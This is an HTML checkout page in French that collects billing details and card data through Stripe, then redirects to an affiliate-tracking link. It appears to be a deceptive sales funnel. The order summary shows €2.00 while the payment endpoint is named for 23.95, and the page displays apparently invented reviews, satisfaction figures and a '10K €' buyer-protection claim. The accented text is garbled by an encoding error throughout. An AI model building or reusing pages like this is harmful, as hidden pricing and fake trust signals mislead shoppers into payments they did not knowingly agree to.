<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Paiement s√©curis√©</title>
  <meta name="referrer" content="no-referrer">

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
  </script>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,700,900&display=swap">
  <style>
    :root {
      --bg:#fafafa; --text:#0a2540; --muted:#5b6b82; --line:#e5e7eb; --card:#ffffff;
      --green:#18a957; --accent:#0f9d58; --accent2:#2dd4bf; --warn:#d30000;
      --radius:14px;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; font-family: Inter, system-ui, sans-serif; background: var(--bg); color: var(--text); }
    .wrap { max-width: 1100px; margin: 0 auto; padding: 18px 14px 60px; }
    .safe { background: #0a0a0a; color: #fff; font-size: 12px; padding: 6px 10px; }
    .grid { display: grid; grid-template-columns: minmax(0,1fr) 360px; gap: 18px; }
    @media(max-width:980px) { .grid { grid-template-columns: 1fr; } }
    .card { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 22px; }
    .page-title { font-size: 28px; font-weight: 900; display: flex; align-items: center; gap: 8px; margin: 6px 0 14px; }
    .stars { color: #f6b80c; font-size: 15px; }
    .reviews { color: var(--muted); font-size: 13px; margin-left: 6px; }
    .h2 { font-size: 18px; font-weight: 800; margin: 10px 0 14px; }
    .sub { font-size: 13px; color: #5b6b82; }
    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .form-grid-1 { display: grid; grid-template-columns: 1fr; gap: 10px; }
    @media(max-width:620px) { .form-grid { grid-template-columns: 1fr; } }
    .label { font-weight: 700; font-size: 13px; margin: 4px 0; color: #334; }
    .input, .select, .el {
      width: 100%; background: #fff; border: 1px solid #cfd6e4;
      border-radius: 10px; padding: 12px; font-size: 15px; outline: none;
    }
    .btn {
      width: 100%; border: none; border-radius: 12px; padding: 12px 16px;
      font-weight: 900; font-size: 16px; cursor: pointer;
      background: #16a34a; color: #fff;
    }
    .btn.muted { background: #f1f4f8; color: #20324d; border: 1px solid var(--line); }
    .logos { display: flex; gap: 10px; align-items: center; margin-top: 12px; }
    .logos img { height: 20px; width: auto; display: block; }
    .err {
      display: none; background: #fff1f1; border: 1px solid #f5bcbc;
      color: #9a1a1a; padding: 10px; border-radius: 10px; font-size: 14px; margin-top: 10px;
    }
    .err[aria-hidden="false"] { display: block; }
    .step { display: none; }
    .step[aria-hidden="false"] { display: block; }

    .widget { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 16px; }
    .widget + .widget { margin-top: 12px; }
    .w-title { font-weight: 800; font-size: 16px; margin: 2px 0 10px; }
    .order-row { display: flex; justify-content: space-between; font-size: 14px; padding: 6px 0; border-top: 1px dashed #e6eaf1; }
    .order-row:first-of-type { border-top: none; }
    .tiny { font-size: 12px; color: var(--muted); }
    .delivery {
      display: flex; align-items: center; gap: 12px;
      border: 1px dashed #d9e2ef; background: #f7fbff; padding: 12px; border-radius: 10px;
    }
    .delivery img {
      width: 52px; height: 52px; border-radius: 8px; object-fit: cover;
      border: 1px solid #e6eaf1; background: #fff;
    }
    .trust {
      display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; text-align: center;
    }
    .trust .box { border: 1px solid var(--line); border-radius: 10px; padding: 8px; }
    .trust .big { font-weight: 900; font-size: 18px; }
    .trust .small { font-size: 12px; color: var(--muted); }

    .loading-overlay {
      position: fixed; inset: 0; background: rgba(246,249,252,.92);
      display: none; align-items: center; justify-content: center; z-index: 9999;
    }
    .loading-overlay[aria-hidden="false"] { display: flex; }
    .loading-box {
      width: min(92vw, 460px); background: #fff; border: 1px solid #e6edf5;
      border-radius: 14px; box-shadow: 0 6px 18px rgba(0,0,0,.06);
      padding: 20px; text-align: center; color: #2a3b55;
    }
    .loading-title { font-weight: 800; margin: 2px 0 10px; font-size: 18px; }
    .progress-wrap { width: 100%; height: 10px; background: #ecf1f8; border-radius: 999px; overflow: hidden; }
    .progress-bar {
      width: 0%; height: 100%; background: linear-gradient(90deg,#7aa3ff,#2dd4bf);
      animation: loadingBar 2.2s ease-in-out infinite;
    }
    @keyframes loadingBar { 0%{width:0%} 60%{width:80%} 100%{width:100%} }
  </style>
</head>
<body>
<div class="safe">Paiement s√©curis√© SSL</div>

<div class="wrap">
  <div class="page-title">
    Paiement s√©curis√© üîí <span class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</span>
    <span class="reviews">(2777 avis)</span>
  </div>

  <div class="grid">
    <!-- LEFT -->
    <div class="card">
      <section id="step1" class="step" aria-hidden="false">
        <div class="h2">1. Informations</div>
        <div class="form-grid">
          <div><div class="label">Pr√©nom</div><input id="firstName" class="input" placeholder="Jane"></div>
          <div><div class="label">Nom</div><input id="lastName" class="input" placeholder="Doe"></div>
        </div>
        <div class="form-grid">
          <div style="grid-column:1 / -1"><div class="label">Adresse</div><input id="billingStreet" class="input"></div>
          <div><div class="label">Code postal</div><input id="billingPostcode" class="input"></div>
          <div><div class="label">Ville</div><input id="billingCity" class="input"></div>
        </div>
        <div class="form-grid">
          <div><div class="label">E-mail</div><input id="emailInput" class="input" type="email"></div>
          <div><div class="label">Pays</div><input id="billingCountry" class="input" placeholder="France"></div>
        </div>
        <button id="nextBtn" class="btn">Continuer</button>
        <div class="logos">
          <img src="/visa.png"><img src="/mastercard.png"><img src="/amex.png"><img src="/discover.jpg">
        </div>
      </section>

      <section id="step2" class="step" aria-hidden="true">
        <div class="h2">2. Paiement</div>
        <p class="sub">Les informations de carte sont chiffr√©es et trait√©es par Stripe.</p>
        <div class="form-grid-1">
          <div><div class="label">Num√©ro de carte</div><div id="card-number" class="el"></div></div>
          <div class="form-grid">
            <div><div class="label">Expiration</div><div id="card-expiry" class="el"></div></div>
            <div><div class="label">CVC</div><div id="card-cvc" class="el"></div></div>
          </div>
        </div>
        <div id="err" class="err" aria-hidden="true"></div>
        <div style="display:flex; gap:10px; margin-top:12px">
          <button id="backBtn" class="btn muted" style="width:40%">‚Üê Retour</button>
          <button id="payNow" class="btn" style="width:60%">Payer</button>
        </div>
      </section>
    </div>

    <!-- RIGHT -->
    <aside>
      <div class="widget">
        <div class="w-title" style="text-align:center">Ce que disent nos clients</div>
        <div style="text-align:center;font-weight:700;">Fenella Lara</div>
        <div style="text-align:center;color:#f6b80c;">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
        <p class="tiny" style="text-align:center">J‚Äôai re√ßu mon produit hier. Service client rapide et exceptionnel ! Merci beaucoup.</p>
      </div>

      <div class="widget">
        <div class="delivery">
          <img id="sidebarImg">
          <div><div style="font-weight:800">Livraison rapide √† votre adresse</div><div class="tiny">3‚Äì5 jours ouvrables</div></div>
          <div style="margin-left:auto;font-weight:800">Gratuit</div>
        </div>

        <div class="w-title" style="margin-top:14px">R√©capitulatif de la commande</div>
        <div class="order-row"><span>Total</span><span id="orderTotal">‚Ç¨2.00</span></div>
      </div>

      <div class="widget">
        <div class="w-title">BOUTIQUE DE CONFIANCE</div>
        <div class="trust">
          <div class="box"><div class="big">99%</div><div class="small">Clients satisfaits</div></div>
          <div class="box"><div class="big">SSL</div><div class="small">Chiffr√©</div></div>
          <div class="box"><div class="big">10K ‚Ç¨</div><div class="small">Protection acheteur</div></div>
        </div>
      </div>
    </aside>
  </div>
</div>

<div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
  <div class="loading-box">
    <div class="loading-title">Traitement de votre paiement‚Ä¶</div>
    <div class="progress-wrap"><div class="progress-bar"></div></div>
    <p class="sub" style="margin-top:10px">Veuillez patienter, cela peut prendre quelques secondes.</p>
  </div>
</div>

<script src="https://js.stripe.com/v3"></script>
<script>
window.addEventListener('DOMContentLoaded', () => {
  const stripe = Stripe("pk_live_51SaxeyEV8OvsGiVpMTahrMGQMjZMXD1neiFffQPrybev0TQNcxvVaixH5TfQKzDBNKxLIqcuAgQ1ynYPWXe792D500VQ7Gcw6t");
  const elements = stripe.elements();
  const cardNumber = elements.create('cardNumber');
  const cardExpiry = elements.create('cardExpiry');
  const cardCvc = elements.create('cardCvc');

  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const nextBtn = document.getElementById('nextBtn');
  const backBtn = document.getElementById('backBtn');
  const payBtn = document.getElementById('payNow');
  const errBox = document.getElementById('err');
  const overlay = document.getElementById('loading-overlay');

  nextBtn.onclick = () => {
    step1.setAttribute('aria-hidden','true');
    step2.setAttribute('aria-hidden','false');
    cardNumber.mount('#card-number');
    cardExpiry.mount('#card-expiry');
    cardCvc.mount('#card-cvc');
  };

  backBtn.onclick = () => {
    step2.setAttribute('aria-hidden','true');
    step1.setAttribute('aria-hidden','false');
  };

  payBtn.onclick = async () => {
    payBtn.disabled = true;
    overlay.style.display = "flex";
    overlay.setAttribute('aria-hidden','false');
    errBox.setAttribute('aria-hidden','true');

    const name = document.getElementById('firstName').value + " " + document.getElementById('lastName').value;
    const email = document.getElementById('emailInput').value;
    const address = {
      line1: document.getElementById('billingStreet').value,
      city: document.getElementById('billingCity').value,
      postal_code: document.getElementById('billingPostcode').value,
      country: "FR"
    };

    try {
      const pm = await stripe.createPaymentMethod({
        type: "card",
        card: cardNumber,
        billing_details: { name, email, address }
      });

      if (pm.error) throw new Error(pm.error.message);

      const res = await fetch("/api/stripe/one-time-23-95", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentMethodId: pm.paymentMethod.id,
          name, email, address
        })
      });

      const data = await res.json();
      if (!data.clientSecret) throw new Error(data.error || "Erreur de paiement");

      const result = await stripe.confirmCardPayment(data.clientSecret, {
        payment_method: pm.paymentMethod.id
      });

      if (!result.paymentIntent || result.paymentIntent.status !== "succeeded")
        throw new Error("Paiement non compl√©t√©.");

      const qs = new URLSearchParams();
      qs.set("v", result.paymentIntent.id);
      window.location.href = "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062?" + qs.toString();

    } catch (err) {
      errBox.textContent = err.message;
      errBox.setAttribute('aria-hidden','false');
      payBtn.disabled = false;
      overlay.style.display = "none";
    }
  };
});
</script>
</body>
</html>
